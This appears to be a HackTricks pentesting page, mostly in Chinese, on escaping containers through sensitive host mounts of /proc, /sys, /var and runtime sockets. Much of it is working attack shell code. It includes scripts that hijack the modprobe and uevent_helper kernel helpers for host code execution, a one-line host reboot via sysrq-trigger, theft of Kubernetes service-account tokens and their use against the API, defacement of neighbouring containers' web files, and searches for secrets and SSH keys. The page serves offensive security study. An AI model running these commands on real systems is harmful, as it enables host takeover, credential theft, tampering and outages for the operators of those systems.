# 敏感主机挂载

{{#include ../../../banners/hacktricks-training.md}}

## 概述

主机挂载是实际中导致容器逃逸的重要攻击面之一，因为它们常会把原本精心隔离的进程视图还原为对主机资源的直接可见性。危险情况不限于 `/`。将 `/proc`、`/sys`、`/var`、运行时 sockets、kubelet 管理的状态或设备相关路径以 bind mounts 方式挂入，可能暴露内核控制接口、凭证、相邻容器的文件系统以及运行时管理接口。

本页独立于各个防护页面，因为滥用模型具有横切性质。可写的主机挂载之所以危险，部分原因在于 mount namespaces，部分原因在于 user namespaces，部分原因在于 AppArmor 或 SELinux 的覆盖情况，部分原因在于暴露了哪个具体的主机路径。将其作为一个独立主题有助于更清晰地分析攻击面。

## `/proc` 暴露

procfs 包含普通的进程信息以及高影响力的内核控制接口。像 `-v /proc:/host/proc` 这样的 bind mount，或容器视图暴露了意外的可写 proc 条目，可能导致信息泄露、拒绝服务，甚至直接在主机上执行代码。

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 滥用

首先检查哪些高价值的 procfs 条目是可见或可写的：
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

这些路径因不同原因而值得关注。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时可能成为主机代码执行路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是用于内核利用的强力侦察来源。`sched_debug` 和 `mountinfo` 会暴露进程、cgroup 和文件系统上下文，能帮助从容器内重建主机布局。

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

每个路径的实际价值不同，把它们都当作具有相同影响来处理会让分类更困难：

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/core_pattern`
如果可写，这是 procfs 中影响最高的路径之一，因为内核在崩溃后会执行一个 pipe handler。能够把 `core_pattern` 指向存放在其 overlay 或挂载的主机路径中的 payload 的容器，通常可以获得主机代码执行。关于专门示例请参见 [read-only-paths.md](protections/read-only-paths.md)。

- `/proc/sys/kernel/modprobe`
This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/kernel/modprobe`
此路径控制内核在需要调用模块加载逻辑时使用的 userspace helper。如果容器可写并在主机上下文中被解释，它可以成为另一个主机代码执行原语。若能结合触发该 helper 路径的手段，其价值尤其高。

- `/proc/sys/vm/panic_on_oom`
This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/vm/panic_on_oom`
这通常不是一个干净的逃逸原语，但它可以把内存压力转化为全主机的拒绝服务：将 OOM 情况变为内核 panic 行为。

- `/proc/sys/fs/binfmt_misc`
If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/sys/fs/binfmt_misc`
如果注册接口可写，攻击者可能为选定的 magic 值注册一个 handler，并在执行匹配文件时获得主机上下文的执行。

- `/proc/config.gz`
Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/config.gz`
对内核利用的分类很有用。它有助于确定哪些子系统、缓解措施和可选内核特性已启用，而无需主机上的包元数据。

- `/proc/sysrq-trigger`
Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/sysrq-trigger`
主要是拒绝服务路径，但非常严重。它可以立即重启、触发 panic 或以其他方式干扰主机。

- `/proc/kmsg`
Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kmsg`
揭示内核 ring buffer 消息。对主机指纹识别、崩溃分析有用，并且在某些环境下会泄露对内核利用有帮助的信息。

- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/kallsyms`
可读时非常有价值，因为它暴露了导出的内核符号信息，可能有助于在内核利用开发中破除地址随机化的假设。

- `/proc/[pid]/mem`
This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/[pid]/mem`
这是一个直接的进程内存接口。如果在满足必要的 ptrace 式条件下能访问目标进程，它可能允许读取或修改其他进程的内存。其现实影响在很大程度上取决于凭证、`hidepid`、Yama 和 ptrace 限制，因此这是一个强大但有条件的路径。

- `/proc/kcore`
Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kcore`
暴露了类似 core 镜像的系统内存视图。该文件体积巨大且使用不便，但如果可读性有意义，则表明主机内存表面严重暴露。

- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/kmem` and `/proc/mem`
历史上是高影响的原始内存接口。在许多现代系统上它们被禁用或严格限制，但如果存在且可用，应视为关键发现。

- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/sched_debug`
Leaks 调度和任务信息，可能暴露主机进程身份，即使其他进程视图看起来比预期更“干净”。

- `/proc/[pid]/mountinfo`
Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.
- `/proc/[pid]/mountinfo`
对于重建容器在主机上的实际位置、哪些路径由 overlay 支持，以及可写挂载是对应主机内容还是仅对应容器层，极其有用。

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
如果 `/proc/[pid]/mountinfo` 或 overlay 细节可读，使用它们来恢复容器文件系统在主机上的路径：
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
这些命令很有用，因为许多 host-execution 技巧需要将容器内的路径转换为从主机视角的对应路径。

### 完整示例： `modprobe` Helper Path Abuse

如果 `/proc/sys/kernel/modprobe` 可以从容器内写入，并且 helper path 在主机上下文中被解释，则它可以被重定向到攻击者控制的 payload：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
确切的触发取决于目标和 kernel 的行为，但重要的一点是，可写的 helper 路径可以将未来的 kernel helper 调用重定向到 attacker-controlled host-path 的内容。

### 完整示例：使用 `kallsyms`、`kmsg` 和 `config.gz` 的 Kernel Recon

如果目标是评估可利用性而不是立即逃逸：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
这些命令有助于判断是否可以看到有用的符号信息、最近的 kernel 消息是否揭示了有趣的状态，以及哪些 kernel 特性或 mitigations 被编译进来。影响通常不是直接导致逃逸，但它可以显著缩短 kernel 漏洞的 triage。

### 完整示例：SysRq Host Reboot

如果 `/proc/sysrq-trigger` 可写并且可在 host 视图中访问：
```bash
echo b > /proc/sysrq-trigger
```
The effect is immediate host reboot. This is not a subtle example, but it clearly demonstrates that procfs exposure can be far more serious than information disclosure.

## `/sys` 暴露

sysfs exposes large amounts of kernel and device state. Some sysfs paths are mainly useful for fingerprinting, while others can affect helper execution, device behavior, security-module configuration, or firmware state.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

These paths matter for different reasons. `/sys/class/thermal` can influence thermal-management behavior and therefore host stability in badly exposed environments. `/sys/kernel/vmcoreinfo` can leak crash-dump and kernel-layout information that helps with low-level host fingerprinting. `/sys/kernel/security` is the `securityfs` interface used by Linux Security Modules, so unexpected access there may expose or alter MAC-related state. EFI variable paths can affect firmware-backed boot settings, making them much more serious than ordinary configuration files. `debugfs` under `/sys/kernel/debug` is especially dangerous because it is intentionally a developer-oriented interface with far fewer safety expectations than hardened production-facing kernel APIs.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` 可能会揭示 AppArmor、SELinux 或另一个 LSM 表面是否以本应保留为主机专用的方式可见。
- `/sys/kernel/debug` 通常是这一组中最令人警觉的发现。如果 `debugfs` 已挂载且可读或可写，则会暴露出广泛的面向 kernel 的接口，其具体风险取决于启用的 debug 节点。
- EFI 变量暴露较少见，但一旦存在影响很大，因为它涉及固件支持的设置，而非普通的运行时文件。
- `/sys/class/thermal` 主要与主机稳定性和硬件交互相关，而不是用于那种 neat shell 式 escape。
- `/sys/kernel/vmcoreinfo` 主要用于主机指纹识别和崩溃分析，是理解低级别 kernel 状态的有用来源。

### 完整示例： `uevent_helper`

如果 `/sys/kernel/uevent_helper` 可写，则在触发 `uevent` 时 kernel 可能会执行攻击者控制的辅助程序：
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container.

## `/var` 暴露

将主机的 `/var` 挂载到容器中常被低估，因为它看起来没有像挂载 `/` 那样戏剧性。实际上，这通常足以访问 runtime sockets、container snapshot directories、kubelet-managed pod volumes、projected service-account tokens，以及相邻应用的文件系统。在现代节点上，`/var` 往往是最有操作价值的容器状态实际存放的位置。

### Kubernetes 示例

带有 `hostPath: /var` 的 pod 通常可以读取其他 pods 的 projected tokens 和 overlay snapshot content：
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
这些命令很有用，因为它们能判断挂载点暴露的是无关紧要的应用数据还是可能造成严重影响的集群凭证。可读的 service-account token 可能会立即将本地代码执行转变为对 Kubernetes API 的访问。

如果存在该 token，请验证它能访问哪些资源，而不要仅仅止步于发现 token：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
这里的影响可能远大于本地节点访问。具有广泛 RBAC 的 token 可以把已挂载的 `/var` 变成对整个集群的妥协。

### Docker 与 containerd 示例

在 Docker 主机上，相关数据通常位于 `/var/lib/docker`，而在基于 containerd 的 Kubernetes 节点上，它可能位于 `/var/lib/containerd` 或 snapshotter 特定的路径：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
如果已挂载的 `/var` 暴露了另一个工作负载的可写快照内容，攻击者可能能够修改应用文件、植入网页内容或更改启动脚本，而无需修改当前容器配置。

一旦发现可写的快照内容，具体滥用思路包括：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
这些命令很有用，因为它们展示了挂载的 `/var` 的三大主要影响类别：application tampering、secret recovery，以及 lateral movement into neighboring workloads。

## 运行时套接字

敏感的主机挂载通常包含运行时套接字而不是完整目录。它们非常重要，因此在此再次强调：
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
参见 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) 以获取一旦挂载了这些套接字之一后的完整利用流程。

作为一个快速的首次交互模式：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
如果其中任何一个成功，从“已挂载的套接字”到“启动一个权限更高的同级容器”的路径，通常比任何内核突破路径都短得多。

## Mount-Related CVEs

宿主机挂载也与运行时漏洞相关。重要的近期示例包括：

- `CVE-2024-21626` 在 `runc` 中，其中 a leaked directory file descriptor 可能 将 工作目录 置于 主机 文件系统 上。
- `CVE-2024-23651` 和 `CVE-2024-23653` 在 BuildKit 中，其中 OverlayFS copy-up races 可能 在 构建 期间 产生 指向 主机 路径 的 写入。
- `CVE-2024-1753` 在 Buildah 和 Podman 的构建流程中，其中 在 构建 期间 精心 构造 的 bind mounts 可能 会 使 `/` 以 读写 模式 暴露。
- `CVE-2024-40635` 在 containerd 中，其中 一个 大 的 `User` 值 可能 溢出，导致 UID 0 的 行为。

这些 CVE 之所以重要，是因为它们表明挂载处理不仅仅是操作员的配置问题。运行时本身也可能引入基于挂载的逃逸条件。

## Checks

使用以下命令快速定位价值最高的挂载暴露：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root、`/proc`、`/sys`、`/var` 和 runtime sockets 都是高优先级的发现。
- 可写的 proc/sys 条目通常意味着该挂载暴露的是宿主机范围的内核控制，而不是安全的容器视图。
- 挂载的 `/var` 路径应当进行凭证与相邻工作负载的审查，而不仅仅是文件系统的审查。
